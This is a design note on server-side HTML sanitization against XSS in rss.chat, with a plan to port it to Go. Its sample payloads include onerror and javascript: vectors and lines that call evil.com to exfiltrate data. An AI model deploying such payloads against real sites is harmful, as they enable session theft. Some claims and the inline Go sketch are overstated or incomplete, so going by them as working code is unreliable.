# HTML Sanitization in rss.chat

## The Security Issue

**Problem**: Posts are written by users and displayed to everyone. If a user includes malicious HTML/JavaScript in their post, it executes in every reader's browser.

**Example Attack**:
```html
<img src=x onerror="alert('XSS')">
<script>alert('Steal session tokens')</script>
<iframe src="https://evil.com/steal-data"></iframe>
```

**Before v0.6.3**: Posts were stored exactly as received, code and all. Only relied on clients/browsers' security, which is insufficient.

**After v0.6.3**: Posts are cleaned on the **server side before storage**. This means:
- ✅ Protects all users reading all feeds (RSS, timeline, etc)
- ✅ Protects users with old/unusual browsers
- ✅ No XSS can slip through, even from future exploits

## How It Works

### 1. The `sanitize-html` Package

The upstream uses `sanitize-html` (npm package), a Node.js library that:
- Parses HTML/XML into a DOM tree
- Strips out dangerous tags and attributes
- Allows only whitelisted safe tags/attributes
- Outputs clean HTML

### 2. Legal Tags Configuration

From `config.json`:
```javascript
legalTags: {
  allowedTags: [
    "p",          // paragraphs
    "br",         // line breaks
    "a",          // links
    "b",          // bold
    "i",          // italic
    "strong",     // strong emphasis
    "em",         // emphasis
    "img",        // images
    "blockquote", // quotes
    "ul",         // unordered lists
    "ol",         // ordered lists
    "li",         // list items
    "h3"          // headings
  ],
  allowedAttributes: {
    a: ["href"],  // links can have href
    img: ["src", "alt"]  // images can have src and alt
  }
}
```

### 3. Processing Pipeline

Posts go through this sequence:

```
Raw HTML → Trim Blanks → Linkify URLs → Sanitize HTML → Store in DB
                                            ↓
                                    Remove dangerous tags
                                    Remove dangerous attributes
                                    Remove scripts/iframes/etc
                                    ↓
                                  Clean HTML
```

**In `rssnetwork.js`**:
```javascript
const theNewItem = {
  title: postRec.title,
  description: sanitizeHtmltext(
    linkifyUrls(
      trimTrailingBlankLines(postRec.description)
    )
  ),
  // ... other fields
}
```

### 4. What Survives Sanitization

✅ **Kept** (safe formatting):
- Paragraphs, line breaks
- Bold, italic, strong, emphasis
- Links (`<a href="url">`)
- Images (`<img src="url" alt="text">`)
- Blockquotes, lists, headings
- Plain text

❌ **Removed** (dangerous):
- `<script>`, `<style>` tags
- Event handlers (`onclick`, `onerror`, `onload`, etc)
- `<iframe>`, `<object>`, `<embed>`
- Style attributes (`style="...expression()"`)
- Dangerous protocols (`javascript:`, `data:`)
- Unknown attributes
- Any attributes on non-whitelisted tags

### 5. Examples

**Input** (attempted XSS):
```html
<p>Check this out: <img src=x onerror="alert('hacked')"></p>
<script>fetch('https://evil.com/steal')</script>
<a href="javascript:void(0)">Click me</a>
```

**Output** (after sanitization):
```html
<p>Check this out: <img src="x" alt=""></p>
<a>Click me</a>
```

The `onerror` handler is gone, the `<script>` tag is gone, the `javascript:` protocol is gone.

**Input** (legitimate HTML):
```html
<p>Here's a quote:</p>
<blockquote>
  <p>This is <strong>really</strong> important</p>
  <ul>
    <li>Point 1</li>
    <li>Point 2</li>
  </ul>
</blockquote>
<p>See <a href="https://example.com">this link</a>.</p>
<p><img src="/media/123" alt="My photo"></p>
```

**Output** (after sanitization):
```html
<p>Here's a quote:</p>
<blockquote>
  <p>This is <strong>really</strong> important</p>
  <ul>
    <li>Point 1</li>
    <li>Point 2</li>
  </ul>
</blockquote>
<p>See <a href="https://example.com">this link</a>.</p>
<p><img src="/media/123" alt="My photo"></p>
```

Everything legitimate is preserved.

## Implementation for Go Version

### Option 1: Use `bluemonday` (Recommended)

Popular Go library for HTML sanitization:

```go
import "github.com/microcosm-cc/bluemonday"

var sanitizer = bluemonday.UGCPolicy()  // User-Generated Content safe policy

func SanitizePostHTML(html string) string {
  return sanitizer.Sanitize(html)
}
```

**Advantages**:
- Pure Go, no dependencies
- Drop-in replacement for sanitize-html behavior
- UGCPolicy is designed for user-generated content
- Actively maintained

### Option 2: Inline Sanitization

Implement a whitelist using Go's `golang.org/x/net/html` parser:

```go
func SanitizePostHTML(html string) string {
  doc, _ := html.Parse(strings.NewReader(html))
  return sanitizeNode(doc).String()
}

func sanitizeNode(n *html.Node) *html.Node {
  if isAllowedTag(n.Data) && isAllowedAttributes(n.Attr) {
    // Keep this node, recurse into children
  } else {
    // Remove this node but keep sanitized children
  }
}
```

**Advantages**:
- No external dependencies (if using stdlib only)
- Full control over behavior

**Disadvantages**:
- More code to maintain
- Harder to get right

### Where to Apply

In `api/writes.go`, update both handlers:

**HandleNewPost**:
```go
linkified, _ := LinkifyURLs(req.Description)
sanitized := SanitizePostHTML(linkified)  // Add this line

newItem := db.NewItem{
  Description: sanitized,  // Use sanitized version
  // ...
}
```

**HandleUpdatePost**:
```go
if description != "" {
  linkified, _ := LinkifyURLs(description)
  sanitized := SanitizePostHTML(linkified)  // Add this line
  description = sanitized
}
```

### Configuration (Optional)

Add to `config/config.go`:

```go
type Config struct {
  // ... existing fields ...
  
  // HTML Sanitization
  AllowedTags []string `json:"allowedTags"`  // Custom whitelist
  MaxPostLength int `json:"maxPostLength"`    // Max characters (e.g., 5000)
  
  // Set defaults if not provided
}

func (c *Config) applyDefaults() {
  if len(c.AllowedTags) == 0 {
    c.AllowedTags = []string{
      "p", "br", "a", "b", "i", "strong", "em",
      "img", "blockquote", "ul", "ol", "li", "h3",
    }
  }
  if c.MaxPostLength == 0 {
    c.MaxPostLength = 5000
  }
}
```

## Testing

### Test Cases

1. **Legitimate content is preserved**:
   - Links, bold, italic, lists, blockquotes, images all stay intact

2. **Script tags are removed**:
   - `<script>alert('xss')</script>` → `` (removed)

3. **Event handlers are removed**:
   - `<img onerror="alert('xss')">` → `<img>` (onerror gone)

4. **Dangerous protocols are blocked**:
   - `<a href="javascript:alert('xss')">` → `<a>` (href gone)

5. **Unknown tags are removed**:
   - `<iframe src="evil.com">` → `` (removed)
   - `<style>body { display: none; }</style>` → `` (removed)

6. **Attributes on disallowed tags are stripped**:
   - `<div onclick="steal()">` → `` (div not allowed, removed)

7. **Multiple XSS vectors fail**:
   - Data URIs, SVG exploits, CSS expressions, etc.

### Example Test

```go
func TestSanitizePostHTML(t *testing.T) {
  tests := []struct {
    input    string
    expected string
    name     string
  }{
    {
      name:     "preserves links",
      input:    `<a href="https://example.com">click</a>`,
      expected: `<a href="https://example.com">click</a>`,
    },
    {
      name:     "removes scripts",
      input:    `<p>Hello</p><script>alert('xss')</script>`,
      expected: `<p>Hello</p>`,
    },
    {
      name:     "removes event handlers",
      input:    `<img src="x" onerror="alert('xss')">`,
      expected: `<img src="x">`,
    },
    {
      name:     "preserves images with safe attributes",
      input:    `<img src="/media/123" alt="photo">`,
      expected: `<img src="/media/123" alt="photo">`,
    },
  }

  for _, tt := range tests {
    t.Run(tt.name, func(t *testing.T) {
      result := SanitizePostHTML(tt.input)
      if result != tt.expected {
        t.Errorf("got %q, want %q", result, tt.expected)
      }
    })
  }
}
```

## When It's Applied

- ✅ When saving new posts (`/newpost`)
- ✅ When editing posts (`/updatepost`)
- ❌ NOT applied to old posts (only new/edited ones)

This is a **forward-looking security fix** — existing posts might contain scripts, but new ones won't.

## References

- **Upstream implementation**: `sanitizeHtml` from npm package
- **Config in rss.chat**: `legalTags` configuration object
- **Go libraries**:
  - `bluemonday`: https://github.com/microcosm-cc/bluemonday
  - `stdlib html parser`: `golang.org/x/net/html`
- **Vulnerability class**: Cross-Site Scripting (XSS)
- **OWASP**: https://owasp.org/www-community/attacks/xss/
